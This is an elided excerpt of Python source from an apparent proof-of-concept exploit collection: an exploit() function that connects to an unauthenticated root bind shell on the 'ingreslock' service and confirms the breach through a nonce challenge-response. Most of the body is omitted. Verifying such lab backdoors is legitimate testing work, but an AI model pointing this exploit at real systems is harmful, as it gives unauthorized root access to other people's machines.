...
from pocs._delivery import Breach, confirm_shell, make_nonce
...
def exploit(host: str, port: int = DEFAULT_PORT, *, nonce: str = "",
            timeout: float = 8.0) -> Breach:
    """Talk to the unauthenticated root bind shell and confirm it via the shared
    challenge-response primitive.

    Raises RuntimeError if nothing is listening. Otherwise delegates verification
    to ``confirm_shell`` — a genuine breach REQUIRES the target to echo our nonce,
    so a patched/absent box (connection refused) or a tarpit that streams ``uid=0``
    without running our command is reported as a non-breach, never a false pop.
    """
    ...
    # confirm_shell takes ownership of the socket and closes it itself.
    return confirm_shell(shell, service="ingreslock", nonce=nonce, timeout=timeout)
